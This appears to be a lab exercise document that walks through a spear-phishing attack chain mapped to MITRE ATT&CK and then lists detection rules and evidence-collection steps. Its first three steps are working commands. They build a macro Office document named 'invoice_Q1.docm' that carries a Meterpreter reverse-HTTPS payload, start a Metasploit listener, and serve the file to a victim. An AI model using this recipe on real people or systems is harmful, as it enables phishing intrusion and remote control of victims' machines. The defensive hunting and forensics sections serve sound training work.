# Attack Scenario: Phishing → Initial Access

## MITRE ATT&CK Mapping

| Tactic           | Technique                        | ID         |
|------------------|----------------------------------|------------|
| Initial Access   | Phishing: Spear-phishing Link    | T1566.001  |
| Initial Access   | Phishing Attachment              | T1566.002  |
| Execution        | User Execution: Malicious File   | T1204.002  |
| Command & Control| Ingress Tool Transfer            | T1105      |

---

## Scenario Overview

Simulate a spear-phishing campaign targeting the lab Windows host using a malicious Office document with a macro payload that calls back to the attacker's Metasploit listener.

---

## Step 1: Generate Malicious Document

```bash
# On attacker (10.10.10.10)
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=10.10.10.10 \
  LPORT=4443 \
  -f docm \
  -o /root/lab-attacks/phishing/invoice_Q1.docm

# Verify payload
file /root/lab-attacks/phishing/invoice_Q1.docm
```

## Step 2: Start Listener

```bash
msfconsole -q -x "
use exploit/multi/handler;
set payload windows/x64/meterpreter/reverse_https;
set LHOST 10.10.10.10;
set LPORT 4443;
set ExitOnSession false;
exploit -j
"
```

## Step 3: Deliver Document

```bash
# Host the file via HTTP
cd /root/lab-attacks/phishing
python3 -m http.server 8080

# Victim clicks: http://10.10.10.10:8080/invoice_Q1.docm
```

---

## Detection Artifacts to Hunt For

### Suricata
```
alert http any any -> any any (msg:"ET HUNTING Meterpreter HTTPS"; \
  content:"METERPRETER"; http.uri; sid:9000001;)
```

### Zeek
```bash
# Look for suspicious HTTP downloads
grep "docm\|xlsm\|exe" /opt/zeek/logs/current/http.log
```

### Velociraptor VQL
```sql
SELECT * FROM artifact_results(artifact='Windows.Events.ProcessCreation')
WHERE ParentName = "WINWORD.EXE"
AND Name != "splwow64.exe"
```

---

## Evidence Collection

```bash
# Collect browser history (victim)
velociraptor artifacts collect Windows.Browser.Chrome.History

# Collect Office MRU
velociraptor artifacts collect Windows.Registry.OfficeRecentFiles

# Memory dump for meterpreter analysis
velociraptor artifacts collect Windows.Memory.ProcessDump --args ProcessName=WINWORD.EXE
```
